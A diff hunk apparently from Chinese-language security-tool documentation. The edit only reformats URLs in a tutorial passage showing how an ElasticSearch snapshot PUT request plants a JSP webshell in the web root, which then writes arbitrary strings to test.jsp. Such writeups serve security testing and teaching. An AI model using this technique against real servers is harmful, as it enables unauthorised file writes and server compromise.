@@ -96,9 +96,9 @@ curl -XPUT "http://xx.x.x.xxx:xxxx/_snapshot/yz.jsp/yz.jsp" -d '{
 
 ![](/img/products/yakit/ElasticSearch-5.png)
 
-访问http://xx.x.x.xxx:xxxx//wwwroot/indices/yz.jsp/snapshot-yz.jsp
+访问 `http://xx.x.x.xxx:xxxx//wwwroot/indices/yz.jsp/snapshot-yz.jsp`
 这就是我们写入的webshell
 该shell的作用是向wwwroot下的test.jsp文件中写入任意字符串
-如：http://xx.x.x.xxx:xxxx/wwwroot/indices/yz.jsp/snapshot-yz.jsp?f=success，我们再访问/wwwroot/test.jsp就能看到success了
+如：`http://xx.x.x.xxx:xxxx/wwwroot/indices/yz.jsp/snapshot-yz.jsp?f=success` ，我们再访问/wwwroot/test.jsp就能看到success了
 
 ![](/img/products/yakit/ElasticSearch-6.png)
